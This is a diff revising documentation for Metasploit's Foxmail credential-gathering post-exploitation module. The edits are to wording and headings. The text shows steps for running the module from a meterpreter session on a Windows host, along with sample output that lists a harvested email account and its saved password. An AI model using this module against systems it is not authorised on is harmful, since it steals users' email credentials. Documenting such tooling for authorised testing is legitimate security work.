@@ -1,7 +1,7 @@
 ## Verification Steps
 
-  1. Download the latest installer of Foxmail.
-  2. Use foxmail to login email server.
+  1. Download and install Foxmail package from the official website: https://foxmail.com/win/en.
+  2. Use FoxMail to log into a mail server.
   3. Remember to save the account password.
   4. Get a `meterpreter` session on a Windows host.
   5. Do: ```run post/windows/gather/credentials/foxmail```
@@ -11,10 +11,10 @@
 
  **ACCOUNT_PATH**
 
-  - Specifies the Account directory path for Foxmail
+  - Specifies the account directory path for Foxmail
 
 ## Scenarios
-
+### FoxMail 7.2 on Windows
 ```
 [*] Search account files on C:\Foxmail 7.2\Storage
 [+] Parsing configuration file: 'C:\Foxmail 7.2\Storage\kali-team@qq.com\Accounts\Account.rec0', please wait.
@@ -31,7 +31,7 @@ kali-team@qq.com            smtp.qq.com              465   true   fjcqkkeqbuwedd
 
 ```
 
-* Specify ** **ACCOUNT_PATH**
+### FoxMail 7.2 on Windows, with ACCOUNT_PATH specified
 
 ```
 msf6 post(windows/gather/credentials/foxmail) > set account_path "C:\Foxmail 7.2\Storage\"
